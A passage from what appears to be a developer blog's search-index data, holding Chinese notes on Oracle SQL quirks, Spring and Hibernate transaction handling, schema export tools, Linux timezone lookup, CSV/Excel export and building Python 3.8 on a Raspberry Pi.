彩蛋\n\n最近有很多 JAVA 專案是 Maven\n但在找有什麼快速輸入 mvn install\n後來看到[Linux 執行目錄下所有 Script](https://www.opencli.com/linux/linux-run-all-scripts-in-directory)\n突然有靈感應該可以做到\n有空再研究(我沒忘記的話)\n\n","tags":["window"],"categories":["Linux"]},{"title":"Oracle 時間運算 筆記","url":"%2Fblog%2F2020%2F09%2F09%2FOracle-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98%2F","content":"\nTODO: 之後有空來整理\n\n<!--more-->\n\n昨天\n\n```\nAND oh.tran_date BETWEEN TRUNC(SYSDATE - 1) AND TRUNC(SYSDATE) - 1/86400\n```\n[sql - How can I select records ONLY from yesterday? - Stack Overflow](https://stackoverflow.com/questions/1574565/how-can-i-select-records-only-from-yesterday)","tags":["oracle"],"categories":["Oracle"]},{"title":"SQL Between ... AND ...  順序有差","url":"%2Fblog%2F2020%2F09%2F08%2FSQL-Between-AND-%E9%A0%86%E5%BA%8F%E6%9C%89%E5%B7%AE%2F","content":"\n今天寫 Oracle 時候發現 between sysdate and sysdate -1 竟然不能查詢\n原來看一下文件，順序真的是有差的\n\n<!--more-->\n\n## Oracle\n\n> is the value of the boolean expression:\n> expr2 <= expr1 AND expr1 <= expr3\n> If expr3 < expr2, then the interval is empty. If expr1 is NULL, then the result is NULL. If expr1 is not NULL, then the value is FALSE in the ordinary case and TRUE when the keyword NOT is used.\n\n[Oracle BETWEEN Conditions](https://docs.oracle.com/cd/B28359_01/server.111/b28286/conditions011.htm#SQLRF52147)\n\n## MySQL\n\n> If expr is greater than or equal to min and expr is less than or equal to max, BETWEEN returns 1, otherwise it returns 0. This is equivalent to the expression (min <= expr AND expr <= max) if all the arguments are of the same type. Otherwise type conversion takes place according to the rules described in Section 12.3, “Type Conversion in Expression Evaluation”, but applied to all the three arguments. \n\n[MySQL :: MySQL 8.0 Reference Manual :: 12.4.2 Comparison Functions and Operators](https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html#operator_between)\n","tags":["between"],"categories":["SQL"]},{"title":"Oracle 空白字元 和 NULL","url":"%2Fblog%2F2020%2F09%2F08%2FOracle-%E7%A9%BA%E7%99%BD%E5%AD%97%E5%85%83-%E5%92%8C-NULL%2F","content":"\n之前有聽說 Oracle 空白字元跟 NULL 會是一樣的\n但沒搞清楚\n今天果然踩到地雷了\n趕快來釐清一下\n\n<!--more-->\n\n空白字元查 insert into 進去時候，Oracle 會轉成 NULL\n所以查詢 select ... where xxx is **null** 要放 null\n空白字元查詢會找不到\n\n[Oracle中的NULL、’’（空字符串）以及’_’（空格） - Memory4Young - 博客园](https://www.cnblogs.com/memory4young/p/use-null-empty-space-in-oracle.html)","tags":["oracle"],"categories":["Oracle"]},{"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","url":"%2Fblog%2F2020%2F09%2F06%2FHibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F%2F","content":"\n之前我有做過[Spring 交易事務失效 | 程式狂想筆記](https://malagege.github.io/blog/2020/08/27/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/)\n我以為大概了解 Spring 交易事務原理\n但是我又遇到奇怪問題\n在研究了一番，終於找到一些問題\n\n<!--more-->\n\n## 發現問題\n\n之前以為 Hibernate 的 save 跟 jpa save的事情差不多\n由於公司專案是使用 SSH 框架\n跟我練習使用 Spring boot 結果不太一樣\n花了一些時間研究並觀察\n\n首先是 Hibernate 持久層\n更改資料不做save 也會被儲存\n\n**但今天我今天進入第一個@transactional 取出來的 Entity 取進去 第二個 @transactional 做 dao.save 竟然出現錯誤\n後來改成 update 就不會有這個問題**\n\n> 之前學 Spring boot 有聽說 save 會做判斷是否 新增/修改\n> 我在 Hibernate 確實都可以用\n> 但這個範例竟然錯了\n\n我後來跑去 Spring Boot JPA 發現 dao 沒有 update\n這時候我懷疑 Hibernate 跟 JPA 不一樣\n[spring - Update or SaveorUpdate in CRUDRespository, Is there any options available - Stack Overflow](https://stackoverflow.com/questions/24420572/update-or-saveorupdate-in-crudrespository-is-there-any-options-available)\n\n\n### 為什麼會發生這個問題呢?我做 update 就可以正常修改\n\n> Persistent狀態的物件對應於資料庫中的一筆資料，物件的id值與資料的主鍵值相同，並且Session實例尚未失效，在這期間您對物件的任何狀 態變動，在Session實例關閉（close）或Transaction實例執行commit()之後，資料庫中對應的資料也會跟著更新。\n>\n> 如果您將Session實例關閉（close），則Persistent狀態的物件會成為Detached狀態。\n> ...\n> ...\n> Detached狀態的物件可以使用update()方法使之與資料庫中的對應資料再度發生關聯，此時Detached狀態的物件會變為 Persistent狀態。\n> 參考: [實體物件生命週期](https://openhome.cc/Gossip/HibernateGossip/EntityObjectLifeCycle.html)\n\n### 我的Hibernate 物件變成了Detached ??? \n\n\n我的Hibernate 物件變成了Detached ??? \n最後爬到這篇文章\n\n> getCurrentSession得到的session是和事務綁定的session，所以：\n> 1，要用getCurrentSession生產的session，就必須有事務環境，意思就是你必須在調用session方法之前，session.beginTransaction（）；就算你只是get或者query\n> 2，在事務提交之後，即session.getTransaction().commit()之後，session自動關閉，所以你用getCurrentSession，只需要commit事務，不要去調用session.close()。\n> \n> 3，你用的是ssh，spring為hibernate的current_session_context_class配置了一個SpringSessionContext來幫你管理getCurrentSession中的session，所以，你在OpenSessionInview的時候，spring就自動的幫你打開了session——>你在執行用AOP包裝的事務的時候，事務就開啟了——>執行你的業務方法——>提交事務（注意，hibernate管理的getCurrentSession在提交事務的時候才會關閉ession，而spring提供的這個SpringSessionContext不會） ——>opensessioninview關閉session。\n> 從上面的執行流程可以看出，你在SSH集成的時候，如果用的是getCurrentSession的集成方式，就不能設置hibernate的current_session_context_class為thread，而應該空著，讓spring幫你。\n> 參考:[hibernate中创建session的两种方式方式，区别在哪里？_qq_25843323的博客-CSDN博客](https://blog.csdn.net/qq_25843323/article/details/50286643) {% asset_link web2.png 備份圖 %}\n\nHibernate daoImpl\n\n```java\n    protected Session getSession() {  \n        return this.sessionFactory.getCurrentSession();  \n    }  \n\n    public void save(T entity) throws Exception {  \n        this.getSession().save(entity);  \n    }  \n```\n\nSpring Boot CRUDRepository\n```java\n    @Transactional\n    public <S extends T> S save(S entity) {\n        if(this.entityInformation.isNew(entity)) {\n            this.em.persist(entity);\n            return entity;\n        } else {\n            return this.em.merge(entity);\n        }\n    }\n```\n\n我的SSH 專案使用this.sessionFactory.getCurrentSession(); \ndaoImpl 裡面確實沒看到 session.close\n上面這篇應該不是錯的\n我也曾經改過 thread 也不能跑\n\n\n### Hibernate @Transactional 每做一次都會 commit 並 session 關閉\n\n上面說明總結，因為 session 使用 `getCurrentSession();`\n@Transactional 會依照 session 規則，最後會做 commit\nHibernate 連線會自動關閉(session.close)\n**注意這邊我講的是我公司專案，不是 Spring Boot JPA**\n\n所以之前我不了解規則，有時候會出現 No session 問題\n但是 Spring Boot JPA 就沒有這個問題\n現在猜測我之前是遇到這個問題\n\n以下可能是錯誤資訊，發現錯誤會修正 ============\n\n### Spring Boot JPA save 使用 @Transactional 不會做 commit?\n\n下面刪掉的跳過，應該是 Spring 傳播事務不會 commit\n重複 REQUIRED 兩層不會 commit，原因是兩層都是使用同一個交易\n之前 @Transactional 失效問題可能是這裡面提到問題[Spring 交易事務失效 | 程式狂想筆記](https://malagege.github.io/blog/2020/08/27/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/)\n之前我也不是很熟....\n\n簡單來刷，@Transactional 下面那一層不會 commit，但是他有做 flush 動作\n@Transactional 回到上一層結束時候，才會做 commit\n但 Spring Boot JPA commit時候，並不會像 Session 一樣會 close 掉\n這一點真的很方便\n\nHibernate 連線問題不確定[Hibernate Tips: How to access Hibernate APIs from JPA](https://thorben-janssen.com/hibernate-tips-access-hibernate-apis-jpa/)\n能不能解決\n\n~~看這邊問題，我想到 Spring 交易事務是使用AOP代理模式去做beginTransactional，最後會做`commit`~~\n~~這邊我有整理[Spring 交易事務失效 | 程式狂想筆記](https://malagege.github.io/blog/2020/08/27/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/)~~\n\n~~但Spring Boot JPA 的save 怎麼沒有 commit? 能順外面用 @Transactional 做 commit 和 rollback??~~\n\n```java\n    @Transactional\n    public <S extends T> S save(S entity) {\n        if(this.entityInformation.isNew(entity)) {\n            this.em.persist(entity);\n            return entity;\n        } else {\n            return this.em.merge(entity);\n        }\n    }\n```\n\n> 主要就是判斷這個對象數據庫裡面是否存在，如果存在則更新， 如果是不存在則新增；根據事務的傳播性，在執行persist或者merge操作之後並不會直接提交事務。而是在所有循環保存之後@Transaction註解會統一flush,commit事務 ,下面介紹關於EntityManager常用API\n\n[springboot jpa 批量保存數據--EntityManager和 JpaRepository - WenQ001 - 博客園](https://www.cnblogs.com/wenq001/p/9264861.html)\n\n~~這邊有提到使用**persist 或者 merge 操作之後並不會直接提交事務**~~\n\n這邊我會錯意，其實我寫這一段覺得還是哪裡怪怪的\n後來查了一下\n應該是 Spring 事務傳播\n- [Spring事務傳播行為詳解 - 個人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000013341344)  {% asset_link web6.png 備份圖 %}\n這篇寫得很棒!!\n- [Spring声明式事务管理之二：核心接口API - 簡書](https://www.jianshu.com/p/1533f0f5241a)\n- [java - Does Hibernate's Session.close() automatically rollback uncommitted transactions? - Stack Overflow](https://stackoverflow.com/questions/19396563/does-hibernates-session-close-automatically-rollback-uncommitted-transactions)\n- [HibernateTransactionManager和DataSourceTransactionManager_qq_23476319的博客-CSDN博客](https://blog.csdn.net/qq_23476319/article/details/56043282)\n\n### Hibernate 的 commit, flush\n\n- [Persistence Context](https://openhome.cc/Gossip/HibernateGossip/PersistenceContext.html)\n- [Hibernate —— flush和commit的区别 - Java天堂](https://www.javatt.com/p/97654)\n\n\n### 什麼是 persist , merge?\n\n這邊沒研究很清楚，`Spring Boot JPA save 使用 @Transactional 不會做 commit?`\n好像就是這個問題，不會影響到\n\n有看到使用就一定要做事務，不然沒有效果\n\n這邊整理相關連結\n1. [springboot jpa 批量保存數據--EntityManager和 JpaRepository - WenQ001 - 博客園](https://www.cnblogs.com/wenq001/p/9264861.html)\n2. [java - What are the differences between the different saving methods in Hibernate? - Stack Overflow](https://stackoverflow.com/questions/161224/what-are-the-differences-between-the-different-saving-methods-in-hibernate)\n3. [Hibernate save()与persist()区别_攻城狮Luke（刘健彬）-CSDN博客](https://blog.csdn.net/u010739551/article/details/47253881)\n4. [hibernate的各种保存方式的区别 (save,persist,update,saveOrUpdte,merge,flush,lock)等 - DANCE WITH JAVA - BlogJava](http://www.blogjava.net/dreamstone/archive/2007/07/29/133071.html) {% asset_link web4.png 備份圖 %}\n5. [Hibernate各种保存方式的区别 - 不發光的螢火蟲](https://sites.google.com/site/hzg139/home/orm-jihibernate/hibernate/hibernate) {% asset_link web3.png 備份圖 %}\n6. [Hibernate save, saveOrUpdate, persist, merge, update 区别 - xiaoheike - 博客园](https://www.cnblogs.com/xiaoheike/p/5374613.html) {% asset_link web1.png 備份圖 %}\n[xiaoheike/HibernateSavePersistUpdateMergeDiff](https://github.com/xiaoheike/HibernateSavePersistUpdateMergeDiff)\n\n\n## try catch 到底能不能抓到 @Transactional public method ?\n\n先說一下問題，我因為上面敘述，我接觸專案 DaoImpl.java 是使用 Hibernate  \n我接觸到的專案是不會抓到 try catch <---這邊指的是 dao.save 會抓到\n非使用 Spring Boot JPA 的 try catch 抓地到\n所以我這邊操作出來竟然測出兩種不一樣解果\n\nSpring Boot JPA 使用 try catch(內層)抓地到 Exception <---這邊指的是 dao.save 丟的 Exception 不是一般 Exception\n\n那為什麼會不一樣呢?\n\n這邊我目前猜測是 @Transactional 的關係\nSpring Boot JPA 裡面 .save 就有包一層 @Transactional 所以結束會 flush\n但是我目前接觸到的 DaoImpl.java 就沒有這一層\n所以這是目前最有可能的\n\n### try catch 觀察\n\n只要進入到 @Transactional\n就可以抓到這個\n2020-09-08 21:42:01.333 TRACE 27527 --- [nio-8080-exec-1] o.s.t.i.TransactionInterceptor           : Completing transaction for [org.springframework.data.jpa.repository.support.SimpleJpaRepository.save] after exception: javax.persistence.PersistenceException: org.hibernate.exception.DataException: could not execute statement\n\nCompleting  中文翻譯是「完成中」\n\n[spring-framework/TransactionAspectSupport.java at 673f83e388e5ee992340a623de5a248e95b94c34 · spring-projects/spring-framework](https://github.com/spring-projects/spring-framework/blob/673f83e388e5ee992340a623de5a248e95b94c34/spring-tx/src/main/java/org/springframework/transaction/interceptor/TransactionAspectSupport.java)\n\n當前事務發生錯誤\n2020-09-08 21:42:01.362 DEBUG 27527 --- [nio-8080-exec-1] o.s.orm.jpa.JpaTransactionManager        : Initiating transaction rollback\n\n操作 commit 會看到 Initiating transaction commit\n\n其實只要進入到 @Transactional 都會判斷當下使用哪一種事務方法\n會依據程式碼使用和當下是否有交易連線去做\n\n相關完整可能要看程式碼...，我找不到是哪一段 flush >.<\n\n- [spring-framework/TransactionAspectSupport.java at 673f83e388e5ee992340a623de5a248e95b94c34 · spring-projects/spring-framework](https://github.com/spring-projects/spring-framework/blob/673f83e388e5ee992340a623de5a248e95b94c34/spring-tx/src/main/java/org/springframework/transaction/interceptor/TransactionAspectSupport.java)\n- [Spring源码解析_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili](https://www.bilibili.com/video/BV1oW41167AV?p=38)\n- [Spring源码分析（八）深入了解事务管理的流程](https://www.lagou.com/lgeduarticle/64035.html)\n- [Springboot源码分析之事务拦截和管理 | Spring For All](http://www.spring4all.com/article/15684)\n- [17. Transaction Management](https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/html/transaction.html)\n\n### try catch 最好寫在哪邊?\n\n**外面一層**，之前有看到 p3c看到[alibaba/p3c: Alibaba Java Coding Guidelines pmd implements and IDE plugin](https://github.com/alibaba/p3c)\n\n雖然看到網路上很多文章，都說 try catch(內層)裡面的catch 需要再 throw Exception\n不過我測試 DAO 丟的 Exception 不管你有沒有 throw Exception\n他還會丟一次，當然我猜非一般Dao 丟的 Exception \n@Transactional應該不會在幫你丟，所以要自己丟\n\n\n## 總結/心得\n\n簡單來說，Spring 交易事務不管你用什麼 DB 套件，他們使用原理都是一樣的\n我這邊不一樣的結果是 Spring boot 跟 我使用 Hibernate Dao 實作導致ˋ有不一樣結果\n還有 Hibernate getCurrentSession 做 commit/rollback 實作會關閉交易\n但透過 @Transactional public method 就可以正常抓到 連線，沒有的話可能要注意 commit/rollback 會遇到 no session 問題\n當然 Spring Boot JPA應該不用煩惱\n1. 不會有 commit/rollback 自動關掉連線\n2. save 使用 try catch 都能抓到問題\n\n當然除了這些問題，[Spring 交易事務失效 | 程式狂想筆記](https://malagege.github.io/blog/2020/08/27/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/)\n裡面也要注意 @Transactional 是否有抓到 Spring AOP特性\n往往有時候都是這些問題\n\n所以了解Spring 事務，在程式撰寫應該比較不會遇到一些問題\n希望不會我不要在卡關\norz\n\n","tags":["spring"],"categories":["Java"]},{"title":"Oracle 匯出 Schema 好用工具","url":"%2Fblog%2F2020%2F09%2F03%2FOracle-%E5%8C%AF%E5%87%BA-Schema-%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7%2F","content":"\n最近公司專案需要建制某環境 Table Schema\n但是現有工具沒辦法做到大量匯出Table\n後來 Google 好用的工具\n\n<!--more-->\n\n## scheme2ddl \n\n[qwazer/scheme2ddl: Command line util for export oracle schema to set of ddl scripts](https://github.com/qwazer/scheme2ddl)\n\njava -jar scheme2ddl-2.4.3-SNAPSHOT.jar -url _DB_USERID_/_DB_PASSWORD_:@_Oracle_IP_:1521:_DBNAME_ -o D:/temp/\n\n執行速度非常快!!\n\n\n## 其他看到工具\n\nMySQL 就沒找了，現成 phpmyadmin 都可以做到\n\n不過，剛剛有發現看起來好用工具[k0kubun/sqldef: Idempotent MySQL/PostgreSQL schema management by SQL](https://github.com/k0kubun/sqldef)\n之前有紀錄這些工具[快速產生資料表 alter table 語法 schemalex | 程式狂想筆記](https://malagege.github.io/blog/2020/01/02/%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex/)\n\nDB2 剛好有看到[qwazer/db2-scheme2ddl: Command line util for export IBM DB2 schema to set of ddl scripts](https://github.com/qwazer/db2-scheme2ddl)\n不過我就沒測試了\n\n[qwazer/db2-table2sql](https://github.com/qwazer/db2-table2sql)\n","tags":["oracle"],"categories":["Oracle"]},{"title":"Linux 程式抓取Timezone流程","url":"%2Fblog%2F2020%2F08%2F31%2FLinux-%E7%A8%8B%E5%BC%8F%E6%8A%93%E5%8F%96Timezone%E6%B5%81%E7%A8%8B%2F","content":"\n簡單小記\n\n<!--more-->\n\nLinux 程式抓取Timezone流程\n\n​\n\n[Linux —— 时间（tzselect、timedatactl命令，查看和修改时区，修改时区为东八区）_杰儿__er 的博客-CSDN博客](https://blog.csdn.net/weixin_42167759/article/details/90648225)\n\n​\n\n預設會抓Linux  TZ 環境變數，如果不存在，就會抓取/etc/localtime\n注意這個不是單純txt，會用 linux link 方式去做連結的\n所以可以ls - l /etc/localtime 看到指定的語系\n\n1. echo $TZ;\n2. ls -al /etc/localtime\n\n還可以用指令看 `datetimectl` 可以看目前使用語系\n\n就這麼簡單\n\n​\n\n​\n\n其他小記\nhttps://linuxhint.com/linux_date_command/\n[HTTP日期/时间格式 - 簡書](https://www.jianshu.com/p/e0dd536dd3e4)\n[Python 時間/時區處理 | CKPlus's Blog](https://ckplus.github.io/2016/08/20/python-timezone/)\n\n","tags":["timezone"],"categories":["Linux"]},{"title":"Spring 交易事務失效","url":"%2Fblog%2F2020%2F08%2F27%2FHibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88%2F","content":"\n最近接觸 Spring 專案搭配~~使用 Hibernate~~ 後來想到應該是Spring-Tx\n但是使用上常常處理事務跟我想要的結果不一樣\n這個沒有研究清楚，常常事務那邊會一直卡住\n最近剛好查到資料，這邊整理一下吧\n\n<!--more-->\n\n\n- [一個@Transaction哪裡來這麼多坑？ - 程序員DMZ - 博客園](https://www.cnblogs.com/daimzh/p/13532990.html) {% asset_link web1.png 備份圖 %}\n- [玩转Spring —— 消失的事务 - 知乎](https://zhuanlan.zhihu.com/p/38208248) {% asset_link web2.png 備份圖 %}\n\n## 主要原因\n\n最近有時候發現交易沒有生效\n最近翻到這篇文章\n原來需要注意這個部分\n\n這兩篇寫得很棒\n簡單總結一下\n\n{% asset_img a.jpg Transactional  %}\n\n上圖簡單說明，使用 Transactional 會用代理模式開啟 DB 事務\n但為什麼第一層 Transactional 方法呼叫同個類別(Class)的方法會沒有新開事務呢\n會看到代理(Proxy)類別呼叫第二層是呼叫到原本的(不是 Proxy)類別的 method\n所以...當然就沒有代理\n\n這時候在想要怎麼新開獨立事務\n第一篇寫得很清楚\n\n[玩轉Spring —— 消失的事務 - 知乎](https://zhuanlan.zhihu.com/p/38208248) 這篇文章就是講剛剛的問題，但沒有講要怎麼解決，最後我找到一篇有說要怎麼解決\n[一個@Transaction哪裡來這麼多坑？ - 程序員DMZ - 博客園](https://www.cnblogs.com/daimzh/p/13532990.html#业务代码层面)業務代碼層面這邊有程式碼例子，並且解決方法\n\n第二個例子\n```java\n@Service\npublic class DmzService {\n\t@Transactional\n\tpublic void save(A a, B b) {\n\t\tsaveB(b);\n\t}\n\t\n\t@Transactional(propagation = Propagation.REQUIRES_NEW)\n\tpublic void saveB(B b){\n\t\tdao.saveB(a);\n\t}\n}\n```\n\n兩個@Transactional，saveB 不會新開事務\n我覺得這個跟第一個原因很像\n因為 AOP 代理 第一層做，但是this.saveB 會抓到原本類別 saveB method\n**之前學 Spring 有聽過一個口訣，@Transactional 會抓外面優先執行**\n> 這邊注意遺下優先抓外面，但邏輯是比較有沒有交易連線\n> REQUIRES_NEW 會抓建立新的連線機制\n\n可以看一下交易事務:[Spring事務傳播行為詳解 - 個人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000013341344)\n\n最近也有查到@Transactional class和 method，會優先抓 method 的@Transactional \n沒使用 public method 也會失敗，原因是 AOP 的方法需要 public \n\n**要做事務處理建議使用 XXX.save()**\n這邊 XXX 是指 Spring 注入的對象\n這跟下面解決方式一樣\n\n> Spring默認拋出了未檢查unchecked異常（繼承自 RuntimeException 的異常）或者 Error才回滾事務；其他異常不會觸發回滾事務，已經執行的SQL會提交掉。如果在事務中拋出其他類型的異常，但卻期望 Spring 能夠回滾事務，就需要指定 rollbackFor屬性。\n\n這邊之後有時間在探討這個問題，這篇只先記錄事務處理\n\n問題來了，這些要怎麼解決?\n\n## 解決\n\n[一個@Transaction哪裡來這麼多坑？ - 程序員DMZ - 博客園](https://www.cnblogs.com/daimzh/p/13532990.html#业务代码层面)下免有兩個方法\n\n1. 自己注入自己\n所有 AOP 需要特別建立事務，需要用這個方法比較不會遇到問題\n\n```java\n@Service\npublic class DmzService {\n\t// 自己注入自己\n\t@Autowired\n\tDmzService dmzService;\n\t\n\t@Transactional\n\tpublic void save(A a, B b) {\n\t\tdmzService.saveB(b);\n\t}\n\n\t@Transactional(propagation = Propagation.REQUIRES_NEW)\n\tpublic void saveB(B b){\n\t\tdao.saveB(a);\n\t}\n}\n```\n\n2. 正規方法\n\n```java\n@Service\npublic class DmzService {\n\n\t@Transactional\n\tpublic void save(A a, B b) {\n\t\t((DmzService) AopContext.currentProxy()).saveB(b);\n\t}\n\n\t@Transactional(propagation = Propagation.REQUIRES_NEW)\n\tpublic void saveB(B b){\n\t\tdao.saveB(a);\n\t}\n}\n```\n\n\n詳細看這兩篇，解決我在 Spring 交易事務的疑惑\n沒這兩篇的話，我可能就無法還技術債\n\n## 相關交易處理\n這邊也說得很細\n[Spring 中的事務傳播 - 個人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000015794446)\n\n希望我有時間再整理這些差別\n\n最近在想有什麼方法可以看到交易事務處理狀態\n原本有找到用 Wireshark 抓封包看\n看完這篇應該是不需要了 :)\n\nHibernate 有時起事務會失敗，外層加 @Transactional 就能解決\n這邊就放起個小彩蛋連結(我就不整理了)\n* [hibernate cascade 的坑 | 头头带你飞](https://toutoudnf.github.io/2016/06/26/java/hibernate%20cascade%20and%20inverse%20usage/)\n* [Hibernate4整合spring4報錯----No Session found for current thread - IT閱讀](https://www.itread01.com/p/799954.html)\n* [Spring+Hibernate No Session found for current thread异常分析_老王不让用的博客-CSDN博客](https://blog.csdn.net/wangquan1992/article/details/103068150)\n* [Spring 中的事務傳播 - 個人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000015794446)\n* [终于解决了：No Session found for current thread_lijing_lj928的专栏-CSDN博客](https://blog.csdn.net/lijing_lj928/article/details/50592808)\n* [程序员DMZ - 博客园](https://www.cnblogs.com/daimzh/)\n* [sprin 事务注解@Transactional的实现原理（转） - myseries - 博客园](https://www.cnblogs.com/myseries/p/12167203.html)\n* [技术分享 | 从 wireshark 看 MySQL 8.0 加密连接 - 简书](https://www.jianshu.com/p/a7e57bb92b72)\n* [MySQL_通过binlog查看原始SQL语句 - 掘金](https://juejin.im/post/6844903650293186574)\n* [jquery 高效实现htmlencode()与htmldecode()函数_jackhuclan的专栏-CSDN博客](https://blog.csdn.net/jackhuclan/article/details/79298039?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight)\n* [Showing a Spring transaction in log4j_王奕然的博客-CSDN博客](https://blog.csdn.net/wyxz126/article/details/8752094)\n","tags":["transactional"],"categories":["Java"]},{"title":"sql 匯出csv ,Excel 工具","url":"%2Fblog%2F2020%2F08%2F24%2Fsql-%E5%8C%AF%E5%87%BAcsv-Excel-%E5%B7%A5%E5%85%B7%2F","content":"\n~~之前有寫過~~[malagege/sqlMakecsv: for a sqltocsv package easy sample](https://github.com/malagege/sqlMakecsv)\n嚴格說是我改別人 code 改寫\n簡單陽春寫出 sql 連 MySQL(或 Golang 有支援的DB Driver) 轉 csv, Excel\n注意: 撈出幾百萬資料可能會造成記憶體吃光光\n可能需要手動分別撈出來\n\n<!--more-->\n\n## 自己寫的工具\n\n1. [malagege/sqlMakecsv: for a sqltocsv package easy sample](https://github.com/malagege/sqlMakecsv)\n\n\n最近公司環境 DB 是用 Oracle\n我當初寫沒有塞 Oracle Driver\n最後有查到兩個方式\n\n[gdbc/wrapper at master · identitii/gdbc](https://github.com/identitii/gdbc/tree/master/wrapper)\n1. OJDBC (GDBC) 但 Windows WSL 編譯失敗\n中途發現它編譯還需要改 pom.xml 的 http → https\n裡面有 native-image 指令\n後來發現需要裝[GraalVM 介紹 + 安裝教學](https://kucw.github.io/blog/2019/10/java-graalvm/)\n好險 sdkman 可以搞定這一切\n不過後來排除各種問題\n還是失敗\n\n~~沒有在 Linux 環境安裝~~\n~~所以有空再試試~~\n編譯出來還是失敗\n```\nError: Classes that should be initialized at run time got initialized during image building:\n java.sql.DriverManager was unintentionally initialized at build time. To see why java.sql.DriverManager got initialized use -H:+TraceClassInitialization\n\ncom.oracle.svm.core.util.UserError$UserException: Classes that should be initialized at run time got initialized during image building:\n java.sql.DriverManager was unintentionally initialized at build time. To see why java.sql.DriverManager got initialized use -H:+TraceClassInitialization\n\n\tat com.oracle.svm.core.util.UserError.abort(UserError.java:68)\n\tat com.oracle.svm.hosted.classinitialization.ConfigurableClassInitialization.checkDelayedInitialization(ConfigurableClassInitialization.java:526)\n\tat com.oracle.svm.hosted.classinitialization.ClassInitializationFeature.duringAnalysis(ClassInitializationFeature.java:227)\n\tat com.oracle.svm.hosted.NativeImageGenerator.lambda$runPointsToAnalysis$8(NativeImageGenerator.java:732)\n\tat com.oracle.svm.hosted.FeatureHandler.forEachFeature(FeatureHandler.java:70)\n\n```\n這邊有 OJDBC 8 解決方法，但我看 GDBC 好像是用 6\n不過我不是很熟，所以就沒繼續研究\nhttps://github.com/quarkusio/quarkus/issues/1658#issuecomment-523618130\n\n\n\n2. 原生 Oracle 連線\noci8\n[Oracle Instant Client Downloads | Oracle 台灣](https://www.oracle.com/tw/database/technologies/instant-client/downloads.html)\n不過不想再 window 上面安裝東西\n在 WSL 他又認得是 Window\n所以放棄這個方案\n\n\nOracle 目前還是不能匯出\n有空再做測試處理\n\n最後還是放棄測試，因為可能就算可以執行\n程式搬到別台但腦能不能跑也是一個問題\n\n\n## export2excel\n\n[tinywall/export2excel: Export Mysql/Oracle Data to Excel CSV](https://github.com/tinywall/export2excel)\n\n在 Github 看到有人寫好的好用工具\n這個就能使用 OJDBC 成功連到 Oracle\n可以解決我現階段撈出報表問題\n\n這邊要設定 Run.bat\nset path=\"C:\\Program Files\\Java\\jdk1.7.0_25\\bin\"\n\n如果是在 Linux 記得要調整\n\n```bash\n# window\n#javac -d classes -classpath lib\\jdom-1.0.jar;lib\\poi-3.0-rc4-20070503.jar;lib\\ojdbc14.jar;lib\\mysql-connector-java-5.1.6.jar; src/*.java\n\n# Linux\n# classpath 要改成 / \n# -jar 分號記得要改成冒號 :\njavac -d classes -classpath lib/jdom-1.0.jar:lib/poi-3.0-rc4-20070503.jar:lib/ojdbc14.jar:lib/mysql-connector-java-5.1.6.jar src/*.java\n```\n\n\nCLOB 記得要轉乘 TO_CHAR\n裡面程式沒有做 CLOB 處理","tags":["excel"],"categories":["實用工具"]},{"title":"在樹梅派安裝 flexget","url":"%2Fblog%2F2020%2F08%2F11%2F%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget%2F","content":"\n在樹梅派安裝 flexget\n通常要裝 python 3.5以上\n[更新系統flexget壞掉啦!! | 程式狂想筆記](https://malagege.github.io/blog/2018/01/07/logdown/2018-01-07-4726929/)\n雖然這篇有小記\n但最近我看官方安裝方法有點不太一樣\n這邊小記安裝紀錄\n\n<!--more-->\n\n## 安裝 flexget \n\n### 安裝 Pytnon 3.8\n\napt 無法取得\n所以需要手動編譯 Python\n[How to install Python 3.8 on Raspberry Pi (Raspbian) - installvirtual](https://installvirtual.com/how-to-install-python-3-8-on-raspberry-pi-raspbian/)\n\n```bash\nsudo apt-get update\n\nsudo apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev tar wget vim\n\n# 下載 Python\nwget https://www.python.org/ftp/python/3.8.0/Python-3.8.0.tgz\n\n# 安裝 Python\n# 這過程會很久，我使用 PI 1 ，安裝大概快一整天才好，建議使用 tmux 安裝，以免關掉需要重來\nsudo tar zxf Python-3.8.0.tgz\ncd Python-3.8.0\nsudo ./configure --enable-optimizations\nsudo make -j 4\nsudo make altinstall\n\n# 檢查\npython3.8 -V\n\n# 修改 default 3.8 ，也可以不用做，直接輸入 python3.8\necho \"alias python=/usr/local/bin/python3.8\" >> ~/.bashrc\nsource ~/.bashrc\n\n# clean\nsudo rm -rf Python-3.8.0.tgz\nsudo rm -rf Python-3.8.0\n```\n\n### 另外一種安裝 Python \n\n發現有另外一種方式安裝 Python 3.8\n[Install Python 3.8.1 on Raspberry Pi (Raspbian) - 